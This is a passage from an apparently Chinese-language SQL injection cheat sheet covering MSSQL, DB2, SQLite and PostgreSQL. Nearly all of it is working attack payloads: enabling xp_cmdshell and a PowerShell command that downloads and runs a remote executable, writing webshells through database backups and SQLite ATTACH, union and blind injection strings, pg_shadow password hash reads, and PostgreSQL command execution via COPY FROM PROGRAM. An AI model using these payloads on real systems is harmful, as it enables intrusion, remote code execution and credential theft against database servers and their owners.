select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell'

-- 关闭 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;

-- 开启 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

-- 执行 xp_cmdshell
exec xp_cmdshell 'cmd /c whoami'

-- xp_cmdshell 调用cmd.exe用powershell 远程下载exe并执行
exec xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'

```

  

  

#### 差异备份GetShell

差异备份数据库得到[webshell](https://so.csdn.net/so/search?q=webshell&spm=1001.2101.3001.7020)。在sqlserver里dbo和sa权限都有备份数据库权限，我们可以把数据库备份称asp文件，这样我们就可以通过mssqlserver的备份数据库功能生成一个网页小马。

##### 条件

-   具有db\_owner权限

-   知道web目录的绝对路径

##### 寻找绝对路径的方法

-   报错信息

-   字典爆破

-   根据旁站目录进行推测

-   存储过程来搜索

在mssql中有两个存储过程可以帮我们来找绝对路径：`xp_cmdshell xp_dirtree`

先来看`xp_dirtree`直接举例子

```plain
execute master..xp_dirtree 'c:' --列出所有c:\文件、目录、子目录 
execute master..xp_dirtree 'c:',1 --只列c:\目录
execute master..xp_dirtree 'c:',1,1 --列c:\目录、文件
```

  

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中

  

```plain
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

  

当利用`xp_cmdshell`时，其实就是调用系统命令来寻找文件

  

```plain
?id=1;CREATE TABLE cmdtmp (dir varchar(8000));
?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```

  

## DB2数据库

### 技巧

```plain
可以通过延时语句判断是否为db2数据库(延时了就是db2数据库)
7'/**/and/**/4703=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)/**/or/**/'1'='2
```

  

### current+schema

在DB2中的schema的概念和ORACLE中的概念有着本质的区别：在ORACLE中schema和用户是同一个;在DB2中schema不一定是用户,因为db2内部没有用户的概念,连接用户

必须是操作系统用户.

  

爆表可以使用的表可以是syscat.tables，也可以是syscat.columns、sysibm.columns表

id=-1 union select 1,current schema,tabname,4 from syscat.tables where tabschema=current schema limit 0,1  
id=-1 union select 1,current schema,tabname,4 from syscat.tables where tabschema=current schema limit 1,1  
或者  
id=-1 union select 1,table\_name,column\_name,4 from sysibm.columns where table\_schema=current schema limit 1,1

### 爆列

可以使用的表可以是syscat.columns，也可以是sysibm.columns表

### 盲注

```plain
注用户表数量
'/**/and/**/((select/**/count(NAME)/**/from/**/SYSIBM.SYSTABLES/**/where/**/CREATOR=USER)>10)/**/or/**/'6'='7

注入第一个表名长度
'/**/and/**/(select/**/(LENGTH(NAME))/**/from/**/SYSIBM.SYSTABLES/**/where/**/name/**/not/**/in/**/('COLUMNS')/**/fetch/**/first/**/1/**/row/**/only)=7/**/or/**/'6'='7
    
注入第一个表名		'/**/and/**/ascii((select/**/(substr(NAME,1,1))/**/from/**/SYSIBM.SYSTABLES/**/where/**/name/**/not/**/in/**/('COLUMNS')/**/fetch/**/first/**/1/**/row/**/only))=84/**/or/**/'6'='7

    (select/**/NAME/**/from/**/SYSIBM.SYSTABLES/**/where/**/name/**/not/**/in/**/('COLUMNS')/**/fetch/**/first/**/1/**/row/**/only)='TS_AUTH'
    
注指定表内列名数量
'/**/and (select count(COLNAME) from SYSCAT.columns where TABNAME='TS_AUTH')>2/**/or/**/'6'='7

注入指定表内第一列名长度
'/**/and (select (LENGTH(COLNAME)) from SYSCAT.columns where TABNAME='TS_AUTH' and colno=0)=7/**/or/**/'6'='7

注入指定表内第一个列名
'/**/and ascii((select (substr(COLNAME,1,1)) from SYSCAT.columns where TABNAME='TS_AUTH' and colno=0))=84/**/or/**/'6'='7
    
(ascii从32-126共95个字符，常见：65(A) 97(a) 95(_) 48-57(0-9))
```

  

## SQLite

### 常用信息及语句

数据库版本：  
`select sqlite_version()`

获取所有表名：  
`SELECT name FROM sqlite_master WHERE type='table'`

所有表结构(包含字段名，表名)：  
`SELECT sql FROM sqlite_master WHERE type='table'`

注释符  
`--`

盲注常用函数：`substr()（没有mid、left等函数），判断长度函数length()`

### BOOL盲注

bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。

逻辑判断目前我就翻到一个substr()，应用实例：  
`cond='FALSE' or (substr('abc',1,1)='a')`

```plain
SELECT INSTR('haystack needle haystack', 'needle');  -- 返回 10
```

  

### 延时盲注

sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。

SQLite没有if，可以使用case when … then …

格式`cond='true' AND 1=(case when (bool) then randomblob(100000000) else 0 end)`  
100000000个字符就有明显延时了。

注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次`randomblob(100000000)`，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 `id='' or 1 AND 1=randomblob(1000000)`这样，把N的值缩小100倍。灵活运用。

运用实例：

```plain
' or 1 and 1=(case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end)--
```

### 写文件

需要直接访问数据库，或堆叠查询选项启用（默认关闭）

```plain
';ATTACH DATABASE '/tmp/p0.php' AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES ('<?php eval($_POST[1]);?>');--
```

root权限的话可以写计划任务和公钥，参考redis未授权访问利用。

### 读文件

只能用在Windows上，需要特殊配置。

```plain
load_extension(library_file,entry_point)
```

  

## PostgreSQL

### 技巧

```plain
SELECT position('sql' in 'postgresql');  -- 返回 8
```

  

### 时间盲注

```plain
1、SELECT CASE WHEN (length(current_database())=6) THEN pg_sleep(3) ELSE pg_sleep(0) END  --+      #猜解数据库长度
2、SELECT CASE WHEN (COALESCE(ASCII(SUBSTR((CURRENT_SCHEMA()),0,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+   #猜解数据库名称
3、SELECT CASE WHEN (COALESCE(ASCII(SUBSTR((current_user),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+   #逐位猜解用户
```

### 语句

```plain
数据库版本：version()
当前数据库：current_schema()
当前用户：current_user
是否DBA：(select usesuper from pg_user where usename=current_user limit 1)
数据库IP：inet_server_addr()
应用连接IP：inet_client_addr()
数据目录：(select setting from pg_settings where name='data_directory')
Hash密码：(select passwd from pg_shadow limit 1)
```

### RCE

需要superuser权限

```plsql
CREATE TABLE cmd_exec(t text);COPY cmd_exec FROM PROGRAM 'whoami';SELECT * FROM cmd_exec;
```

# python写脚本

正确的写延时盲注脚本的方法应该是：

```python
try:
    requests.get(url, timeout=3)
except:
    print("延时发生了，注入成功")
```